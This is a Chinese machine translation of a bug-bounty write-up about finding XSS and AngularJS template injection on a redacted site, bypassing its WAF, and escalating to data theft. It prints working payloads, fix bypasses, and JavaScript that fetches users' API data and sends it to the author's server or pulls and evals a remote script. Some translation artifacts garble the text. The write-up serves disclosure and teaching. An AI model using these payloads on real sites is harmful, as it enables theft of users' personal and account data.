# 使用 XSS 窃取您的数据

> 原文：<https://infosecwriteups.com/stealing-your-data-using-xss-bf7e4a31e6ee?source=collection_archive---------0----------------------->

大家好🐥

这篇文章是关于利用我的锁定时间在一个名字必须在这里*编辑*的私有程序下寻找 bug。█████'s 计划自年以来一直很活跃，直到今年，他们的**名人堂**中列出了专业&负责任的黑客名单。尽管如此，我还是设法找到了多个 XSS，并将一个 XSS 的影响升级为敏感数据窃取。所以让我们开始吧🤙。

> **注意:本文旨在帮助新手理解影响升级，并深入了解 XSS 漏洞。**

# 时间线:

# 14.04.2020

打开计算机，开始主动和被动发现█████.的域和所有范围内的资产用过很多工具，比如 Sublist3r，Amass，findomain，subfinder 等等。最后我把所有的输出合并成一个列表。

我不太相信自动化测试和懒惰🙃所以我对列表进行了排序，并对它们都进行了探查。一个接一个地访问了每个域名，并且发现了对我来说可能很有价值的域名。这个游戏还在继续。

# 17.04.2020

经过 2 天的手动操作，对于一个域，我使用 [waybackurls](https://github.com/tomnomnom/waybackurls) 得到了一个很好的端点列表，使用 [Arjun](https://github.com/s0md3v/Arjun) 找到有效的参数，然后得到了一个漂亮的反射😍。

# 有效载荷:

```
1"><div+onload=alert()>XSS-FOREVER</div>
```

在这之后，我有了更多积极的感觉😃我真的可以找到更多，所以🥱.的游戏还在继续

# 18.04.2020

第一次报告后的第二天，我很早就醒了，没有吃早饭就打开了机器，更深入地研究这个问题。

在这次搜寻中，我发现了█████'s 重要子域名 ***的潜在输入。*t24】█████**t26】。com** 。该域一般指用于登录和认证目的。那一刻，这东西让我的血液里充满了肾上腺素🔥。由于这个提到的域名用于生产环境，这有非常严格的 WAF 规则，阻止了 XSS 流行的每一次尝试！**

# 再深入说说我是怎么绕过 WAF 的！

> 被屏蔽的内容:`'`单引号、`<>`标签字符、```、反勾、`[]`方括号以及所有其他 XSS 关键字，如 alert、prompt、console.log 等。
> 
> 所以我有非常有限的白名单字符，即`()`圆括号、`“`双引号、`{}`花括号

反思发生在这个时候:

> `*<tag ng-init=“*` █████ `*= { … parameter: ‘reflection’, … }” >*`

开始用`**ng-init**` 使用”和`**onload=alert()**` 但是可悲的是这完全被屏蔽了，也就是说`onload=`被屏蔽了`alert()`也被屏蔽了。由于`<>`受到限制，我无法结束这个标签。尝试了每一个事件处理程序，仍然没有人在这里工作！休息一下！🥱

> 你需要离开你的工作区休息一下，这样当你回来的时候，你会更有精神，准备好工作—拜伦脉动器

回来后，我的眼睛刚刚看到`ng-init`，这意味着这是 AngularJS 应用，这也让我想起了 **XSS 使用 AngularJS** 注射，通常称为**客户端模板注射**。在下一秒钟内谷歌了这个，并登陆到这里: [PortSwigger 文章](https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs)。

从基本确认开始:

> `*{{7*7}} => reflected as => 49*`

确认后，我尝试与 XSS 有效载荷:

> `*{}.”)));foo(1)//”;*`

现在这个注入点被确认为注入，但是像`alert()`等功能被很精确地屏蔽了。在网上寻找安古拉杰 XSS 媒体的文章、评论、安全研究论文等等。在这方面投入几个小时就能得到有效载荷，但问题是长度或在一部分中完成有效载荷。所以我把有效载荷分成两部分，用了两个不同的注射点。

> *使用*绕过被阻止的 JS 功能
> 
> `*_=prompt,_(1)*`

最终工作有效载荷:

> `*{{“a”.constructor.prototype.charAt="".valueOf;$eval("foo()//");}}*`

现在的问题是`$eval()`也被阻塞了，我们知道字符串类型的有效负载需要得到`$eval()`才能执行。整个有效载荷都在工作，但一切都卡在了`$eval()`🤦🏽‍♂️.再次休息了一会儿，阅读 Angular 的开发文档，以找到任何像`eval()`这样的替代功能，并不容易找到。转而阅读 AngularJS 的安全研究论文，这花费了大量的时间和精力。最终发现 AngularJS 的一个功能可以做到这一点。

> *使用*绕过阻塞的角度功能
> 
> `*$eval() => changed to => $evalAsync()*`

好了，现在对于所有被屏蔽的实体，我手里都有旁路，把它们合并起来，形成一个由两部分组成的最终载荷，最终载荷是这样的

```
https://important.█████.com/█████/█████?...&param1=value1"+ng-value={{a="a".constructor.prototype;a.charAt="".valueOf}}&param2=value2+ng-val={{$evalAsync("x=(_=prompt,_(1))//")}}
```

繁荣🥳🎉！我得到了█████'s 第二重要域名的 XSS，起草了一份很好的报告并寄出，这是我的时刻。

令人惊讶的是，同一生产领域有许多相似的子域。因此，相同的 XSS 也存在于所有这些子域名中，我报告了所有这些域名💰💰💰。

有 3 个易受攻击的端点，跨越 4 个相似的域。这种情况持续了 4-5 天，然后我转移到另一个资产去看看。

> 结论:如果你找到一个有效的注射点，记下什么是允许的，什么是被阻止的？请记住适应应用程序的环境，如果任何特定的东西被阻止，环顾四周，寻找旁路和不同的方式来指定或表示同一件事，使用浏览器的控制台进行试错。不要停下来，用力敲！

# 27.04.2020

在完成上述的 bug 查找方法后，我开始研究 API 的工作方式和所有其他的事情。在测试的时候，我发现`404 — Not Found`的情况下非常不寻常的重定向，页面被加载，然后重定向到根端点，即`https://` █████ `.com/`我也有直觉，🧐.这里有问题

![](img/39327d734cb5e7b9426eede6eca31930.png)

读取页面的源代码，因为页面有太多的 HTML 代码，但甚至在呈现页面之前就被重定向到根端点。把这一页交给 [Arjun](https://github.com/s0md3v/Arjun) 🏹用于查找任何错误消息或类似信息的隐藏参数。发现一个有效参数，该参数反映在`<script>`标签的字符串赋值中，即

> `*var foo = 'reflection'*`

这个反射也只有一个被阻塞的实体，即`“`双引号，随机地一些符号没有出现在响应中，否则没有阻塞任何`confirm()`或`eval()`或任何东西。我惊讶的同时也很惊讶！

我再次确认了基本注射:

> 有效载荷:`?foo='+alert()+'`
> 
> 体现:`var foo = ''+alert()+''`而美丽的警戒出现在█████'s 主域，这一刻是意料之外的，简直太神奇了！想象一下！

但是这一次，我不想只报道`alert(1)`🤧。在测试 API 的时候，我知道 API 调用只能在█████主域名下进行，不能在子域下进行。所以我想利用这个千载难逢的机会把事情升级。我在谷歌上搜索并阅读了许多报告，其中攻击者展示了 XSS 的影响升级。阅读这样的东西给了我跳出框框表演的好主意🤔。

# 想法是:

> *让我们调用 API，复制它们的响应，并将响应发送到我的个人服务器。听起来很简单，对吗？哈哈，没那么 easy🥴！*

# 🚀尝试 0x01:

由于我是一个熟悉开发的人，并且在项目开发期间有 JavaScript 的实际经验，所以很容易在我的脑海中找到逻辑，在代码中也是如此，但是我知道我只有很小的窗口可用，因为一旦页面加载，发生反射的页面将会重定向。同样，我使用了一些快速工作的逻辑，而不是使用 AJAX 的常规老方法，然后处理他们的响应成功错误和 bla bla👽。

我为实现我的想法而制作的 JavaScript 片段:

```
function fe(t) {
    fetch(t).then(t => t.text()).then(t => {
        fetch("https://my-server.com/log/?p=" + btoa(t))
    })
}
urls = ["https://█████.com/v1/api/.../...", 
        "https://█████.com/v2/api/.../...", 
        "https://█████.com/v3/api/.../...",
        ...
], urls.forEach(fe);
```

我想读两三遍会让你明白这里发生了什么。总之:我提到了一个函数`fe()`，它将向`GET`请求传递给该函数的参数值，在从服务器获得响应后，用响应体的 base64 编码值向`my-server.com`发出另一个`GET`请求。接下来是需要调用的`urls`列表，我们希望在完成这个列表后，调用`forEach()`，它将隐式地执行我们的循环，而不会显式地提到任何`for()`或`while()`循环🤖。

> **问题**:这段代码对于`GET`请求长度容量来说太长了

**解决方案**:我在我的服务器上托管了这段 JavaScript 代码，现在在注入点，我只需要调用这段 JavaScript 代码。简单？不完全是。因为我只能访问有限的 JavaScript 上下文，而且 CSP 也已经实现。

# 🚀尝试 0x02:

我可以访问`eval()`，所以让我们使用`eval()`添加我们托管的 JavaScript。我阅读了很多实现这一点的方法，但是它们都没有要求的那么快，因为发生注入的页面在页面加载后会重定向到根端点。所以我参考了 Mozilla 的 [JavaScript 文档。这有助于我使用`async`和`await`获得`eval()ing`我的命令所需的速度，这将获得我的托管脚本并执行它💀。](https://developer.mozilla.org/en-US/docs/Web/JavaScript/)

主注入点的 JavaScript 代码:

```
!async function() {
    let a = await
    function() {
        fetch('https://my-server.com/log.js').then(t => t.text()).then(d => {
            eval(d)
        })
    }()
}();
```

总之:我在异步模式下调用了这个函数，在 await 模式下的函数中又调用了一个函数，这个函数向我上面提到的托管 JavaScript 发出请求。在得到这个请求的响应后，我又有了`eval()ed`我的 JavaScript，它解决了上面提到的问题。这个解决方案可以说是绕过 CSP 规则的证明，CSP 规则不允许运行来自不可信来源的脚本。

> **问题:**在 GET 请求中写这个似乎会在浏览器端产生错误，不知道为什么？

**解决方案:**我对上述整个代码片段进行了 base64 编码，并将其提交给`decodeURIComponent()`，然后将其传递给`atob()`，再传递给`eval()`。相当困惑？

```
█████.com/?foo='+eval(atob(decodeURIComponent('IWFzeW5jIGZ1bmN0aW9uKCkge2xldCBhID0gYXdhaXQgZnVuY3Rpb24oKSB7ZmV0Y2goJ2h0dHBzOi8vbXktc2VydmVyLmNvbS9sb2cuanMnKS50aGVuKHQgPT4gdC50ZXh0KCkpLnRoZW4oZCA9PiB7ZXZhbChkKX0pfSgpfSgpOwo=')))+'
```

> **问题:**一切都按预期运行，一切都很完美，但是对于每 2/5 次尝试，页面重定向甚至会在数据窃取发生之前发生。

# 🚀尝试 0x03:

为了防止重定向的发生，我知道我必须破坏一些东西，这可能会产生 JavaScript 错误，最终在到达重定向状态之前破坏 JavaScript。但在打破这个案例之前，我必须执行所有这些动作，然后我希望有一个明确的突破。

经过分析和许多尝试和错误，这是我用来利用数据窃取的最终有效载荷。

```
█████.com/?foo='+eval(atob(decodeURIComponent('IWFzeW5jIGZ1bmN0aW9uKCkge2xldCBhID0gYXdhaXQgZnVuY3Rpb24oKSB7ZmV0Y2goJ2h0dHBzOi8vbXktc2VydmVyLmNvbS9sb2cuanMnKS50aGVuKHQgPT4gdC50ZXh0KCkpLnRoZW4oZCA9PiB7ZXZhbChkKX0pfSgpfSgpOwo=')))+'});var foo='{ 1,
```

这个最后的有效载荷，停止重定向+以我希望看到的方式执行事情。🤟这真的很有挑战性，因为这是我第一次在真正的 BB 项目中处理和解决这样的问题。

此时，这个恶意制作的 URL 可以在用户周围共享和传播，其帐户登录的用户将直接受到影响。将会有零信号数据在后台被窃取。我演示了被动活动，比如调用 API 并将它们路由到我的服务器并收集它们。对于任何单击此精心制作的 URL 的登录用户，风险如下:

1.  **泄露用户资料详情**如:全名、电子邮件、手机号码、帐户创建日期、用户类型、用户标识、ssotoken 等等。
2.  **泄露用户地址详情**如:所有添加的地址、收件人姓名、addressid、完整地址、手机号码、时间戳。
3.  **用户钱包详情**泄露，如:钱包可用余额、ownedGUID、ssoId。
4.  **订单细节泄露**:订单 Id、订购项目、数量、状态以及你在个人资料中看到的基本上每一个订单细节。
5.  除此之外，我还可以被动地列举登录用户的每一个操作，如钱包账单、订单历史记录、频繁充值的手机号码列表等等，所有这些都可以通过在我的服务器上托管的 JavaScript 代码中添加更多 API 地址来完成。

还有一点要注意的是，这种攻击不仅限于被动的行为，我可以执行更主动的行为，如转移钱包余额，无需交互就可以下单，以及使用其 API 调用执行移动充值，删除用户地址，取消订阅，等等。 ***但是我犯了一个错误，没有为这次主动攻击*** *提供 POC，最终减少了奖励金额*。没问题，又学到了一课💪。

# 让我们来谈谈修复旁路！

在报告完所有问题后，█████开始部署修复程序，并会通知我。对于 XSS，█████试图对我提交的有效载荷进行修复。但是我还是绕过了他们 3-4 次。我觉得这也值得新人分享😀。让我们把它分成 3 个线程。

## 1.第一个 XSS:

修复了我的第一个报告负载，负载为:

```
1"><div+onload=alert()>XSS-FOREVER</div>
```

使用以下方法绕过了对此问题的修复:

```
1\"><x+onpointerover=alert`xss-bypass`>CLICK+HERE+FOR+DETAILS+OF+ERROR</form></body></html>
```

`<div>`、`onload`、`()`上了黑名单。用`<x>`、`onpointerover`和`alert```旁通。

他们又应用了一个修复，但还是绕过了使用 Chrome 特有的事件处理程序。

```
1\"><x+onpointerrawupdate=alert`xss-bypass`>CLICK+HERE+FOR+DETAILS+OF+ERROR</form></body></html>
```

又有一个修正了这个问题，最终它变得不容易受到攻击了。

## 2.使用 XSS 窃取数据

修复了我的第一个报告负载，负载为:

```
█████.com/?foo='+eval(atob(decodeURIComponent('IWFzeW5jIGZ1bmN0aW9uKCkge2xldCBhID0gYXdhaXQgZnVuY3Rpb24oKSB7ZmV0Y2goJ2h0dHBzOi8vbXktc2VydmVyLmNvbS9sb2cuanMnKS50aGVuKHQgPT4gdC50ZXh0KCkpLnRoZW4oZCA9PiB7ZXZhbChkKX0pfSgpfSgpOwo=')))+'});var foo='{ 1,
```

使用以下方式绕过此问题:

`()`被阻止，fix 被要求确认，使用 URL 编码`(` = > `%28`、`)` = > `%29`和使用反勾```绕过这个。

```
█████.com/?foo='+eval%28atob%28decodeURIComponent%28'IWFzeW5jIGZ1bmN0aW9uKCkge2xldCBhID0gYXdhaXQgZnVuY3Rpb24oKSB7ZmV0Y2goJ2h0dHBzOi8vbXktc2VydmVyLmNvbS9sb2cuanMnKS50aGVuKHQgPT4gdC50ZXh0KCkpLnRoZW4oZCA9PiB7ZXZhbChkKX0pfSgpfSgpOwo='%29%29%29+'}%29;var foo='{ 1,
```

又有一个修正了这个问题，最终它变得不容易受到攻击了。

## 3.一束 XSS

修复了我的第一个报告负载，负载为:

```
https://important.█████.com/█████/█████?...&param1=value1"+ng-value={{a="a".constructor.prototype;a.charAt="".valueOf}}&param2=value2+ng-val={{$evalAsync("x=(_=prompt,_(1))//")}}
```

这个有效载荷已经有很多旁路。当这个被封锁的时候，我设法用```绕过了`()`的封锁(适用于除了***important.█████.com***之外的所有其他重要域)

用这个有效负载绕过了它:

```
https://important.█████.com/█████/█████?...&param1=value1"+ng-val={{{}.")));x=alert;x(1)//"}}+"
```

他们也修复了这个问题，所以我再次绕过修复，使用:

```
https://important.█████.com/█████/█████?...&param1=value1"+ng-val={{{}.")));new+Function`al\ert\`XSS-By-Viren\``;//"}}+"
```

使用`al\ert`绕过了阻挡词“alert ”,这两个词很好，并且又修复了一个，最终它变得不容易受到攻击。

最后，bug bounty 不仅仅是关于发现和报告 bug 以获得奖励，而是关于创造性、愤怒和聪明，并且重要的是带着热情工作**而不是为了钱，我提到时间线只是为了让新来者理解，获得越来越多的 bug 可能需要时间，所以只要冷静下来并进行狩猎。这是一个在█████的多个沉睡的 xs 从子域到主子域和主域发现 bug 的故事。**

> 因为这些虫子，我获得了█████'s 虫子奖励计划的奖励。

██.██.2020:因窃取用户信息报告而被█████法院起诉

██.██.2020:所有其它 XSS 报告的 INR █████

首先感谢█████'s 安全团队，感谢他们的良好合作，感谢他们的积极回应。我注意到许多公司甚至不回复你的邮件，而█████有这么好的安全研究员平台值得一提。

最诚挚的感谢 [Somdev Sangwan](https://medium.com/u/6397cd49a043?source=post_page-----509232194a4e----------------------) 🙏因为他关于 XSS 的令人敬畏的知识库，这个知识库和在那里分享的知识是我学习的真正来源。为了修复旁路和提高有效负载，我使用了 [PayloadAllThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection) 存储库🔥。

我想提及对万能真主的赞颂🙏[拉玛勋爵](https://en.wikipedia.org/wiki/Rama)和🙏[哈奴曼勋爵。我相信没有他们的恩典，我什么都不是，我的一切都是他们的礼物。我向他们鞠躬，并将永远向他们鞠躬。](https://en.wikipedia.org/wiki/Hanuman)

*感谢阅读。随时联系，我只是一个消息。这里联系我:*[***insta gram***](https://www.instagram.com/viren__pawar/)*，*[***Twitter***](https://twitter.com/VirenPawar_)*。*